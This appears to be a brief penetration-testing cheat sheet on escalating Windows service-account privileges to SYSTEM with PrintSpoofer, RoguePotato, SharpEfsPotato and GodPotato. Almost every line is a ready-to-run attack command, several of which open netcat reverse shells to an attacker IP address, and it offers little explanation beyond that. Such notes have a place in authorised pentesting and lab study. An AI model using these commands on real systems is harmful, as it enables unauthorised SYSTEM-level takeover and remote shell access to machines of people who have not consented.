JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer, RougePotato, SharpEfsPotato, GodPotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. 


# PrintSpoofer Priv Esc Tool

1. Very simple tool, Just execute the exe with the command you would like to run:
   `c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"`

# RoguePotato

1. test
   `c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999`

# SharpEfsPotato

1. this will execute commands as system admin, this command outputs the `whoami` command to a file so we can visualise it, we could also use this to generate a rev shell as admin
   `SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"`

# GodPotato

1. this is a simple command that will execute commands as admin
   `GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"`
